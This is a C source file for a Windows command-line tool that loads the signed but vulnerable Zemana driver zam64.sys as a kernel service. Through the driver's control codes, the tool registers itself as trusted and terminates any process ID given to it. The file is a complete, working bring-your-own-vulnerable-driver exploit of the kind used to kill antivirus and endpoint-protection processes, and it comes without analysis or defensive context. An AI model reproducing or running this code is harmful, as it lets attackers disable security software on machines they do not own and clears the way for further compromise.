#include <stdio.h>
#include <Windows.h>

#define TerminatorPath           "\\\\.\\ZemanaAntiMalware"
#define IOCTL_REGISTER_PROCESS   0x80002010
#define IOCTL_KILL_PROCESS       0x80002048

LPCSTR servicename = "Killpid";

BOOL InstallDriver(char* Driverpath)
{
	SC_HANDLE hSCM, hService;
	SERVICE_STATUS Servicestatus;

	//establish connection to service control manager
	hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCM == NULL) {
		printf("[OpenScManagerA] error code: 0x%08x\n", GetLastError());
		exit(EXIT_FAILURE);
		return FALSE;
	}

	//Check if the service is already running and its state that whether it is running or stop.
	hService = OpenServiceA(hSCM, servicename, SERVICE_ALL_ACCESS);
	if (hService != NULL)
	{
		printf("[#] Service Already existing\n");

		//Check the state of the service
		if (!QueryServiceStatus(hService, &Servicestatus)) {

			//error in opern handling or some error
			CloseServiceHandle(hSCM);
			CloseServiceHandle(hService);

			printf("[QueryServiceStatus] error code: 0x%08x\n", GetLastError());
			exit(EXIT_FAILURE);
			return FALSE;
		}

		//If the service is stopped, then start the service
		if (Servicestatus.dwCurrentState == SERVICE_STOPPED)
		{
			if (!StartServiceA(hService,0,NULL))
			{
				//something error in starting service
				CloseServiceHandle(hSCM);
				CloseServiceHandle(hService);

				printf("[StartServiceA] error code : 0x%08X\n", GetLastError());
				exit(EXIT_FAILURE);
				return FALSE;
			}

			printf("[#] Starting service KillPid\n");
		}

		//Close Handles
		CloseServiceHandle(hSCM);
		CloseServiceHandle(hService);
		return TRUE;
	}

	//If service is not created before
	hService = CreateServiceA(hSCM, servicename, servicename, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
		Driverpath, NULL, NULL, NULL, NULL, NULL);
	if (hService == NULL)
	{
		//error creating service
		CloseServiceHandle(hSCM);

		printf("[CreateServiceA] error code : 0x%08x\n", GetLastError());
		exit(EXIT_FAILURE);
		return FALSE;
	}

	printf("[#] Service Created Successfully\n");

	//START THE CREATED SERVICE
	if (!StartServiceA(hService,0, NULL))
	{
		CloseServiceHandle(hSCM);
		CloseServiceHandle(hService);

		printf("[StartServiceA] error code: 0x%08x\n", GetLastError());
		exit(EXIT_FAILURE);
		return FALSE;
	}

	printf("[#] Starting service KillPid ..\n");

	CloseServiceHandle(hSCM);
	CloseServiceHandle(hService);

	return TRUE;
}


INT main( INT argc, CHAR *argv[])
{
	WIN32_FIND_DATAA Filedata;
	HANDLE hfile;
	CHAR FullDriverPath[MAX_PATH];
	ULONG pid = 0;

	if (argc != 2) {
		printf("[-] Usage: process_terminator.exe <pid>\n");
		exit(EXIT_FAILURE);
	}

	pid = strtol(argv[1], NULL, 0);
	
	printf("[+] Attempting to terminate pid %i\n", pid);


	hfile = FindFirstFileA("zam64.sys", &Filedata);
	if (hfile != INVALID_HANDLE_VALUE)
	{
		if (GetFullPathNameA(Filedata.cFileName, MAX_PATH, FullDriverPath, NULL) != 0)
		{
			printf("[+] Driver Path found: %s\n", FullDriverPath);
		}
		else {
			printf("[GetFullPathNameA] Error code: 0x%08x\n", GetLastError());
			exit(EXIT_FAILURE);
		}
	}
	else {
		printf("[FindFirstFileA] error code: 0x%08x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	printf("[+] Loading zam64.sys driver...\n");

	if (!InstallDriver(FullDriverPath)) {
		printf("[InstallDriver] Error in Loading driver\n");
		exit(EXIT_FAILURE);
	}

	printf("[+] Driver Loaded Successfully\n");

	//Exploitaion part of the zam64.sys driver
	//opening the handle to the driver zam64.sys 
	HMODULE hZAM = CreateFileA(TerminatorPath,
		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hZAM == INVALID_HANDLE_VALUE) {
		printf("[CreateFileA] error code : 0x%08x\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	ULONG CurrentPid = GetCurrentProcessId();
	ULONG BytesReturned = 0;

	//registry CurrentProcessId in the trusted Process List.
	int ret = DeviceIoControl(hZAM, IOCTL_REGISTER_PROCESS, &CurrentPid, sizeof(CurrentPid), NULL, 0, NULL, NULL);
	if (!ret) {
		printf("[DeviceIoControl] Failed to regsiter in trusted process list Code: 0x%08x\n", GetLastError());
		CloseHandle(hZAM);
		exit(EXIT_FAILURE);
	}

	printf("[+] Terminating the pid %i\n", pid);

	//terminate the process
	ret = DeviceIoControl(hZAM, IOCTL_KILL_PROCESS, &pid, sizeof(pid), NULL, NULL, &BytesReturned, NULL);
	if (!ret) {
		printf("[DeviceIoControl] Failed to kill process id error code: 0x%08x\n", GetLastError());
		CloseHandle(hZAM);
		exit(EXIT_FAILURE);
	}

	CloseHandle(hZAM);

	return EXIT_SUCCESS;
}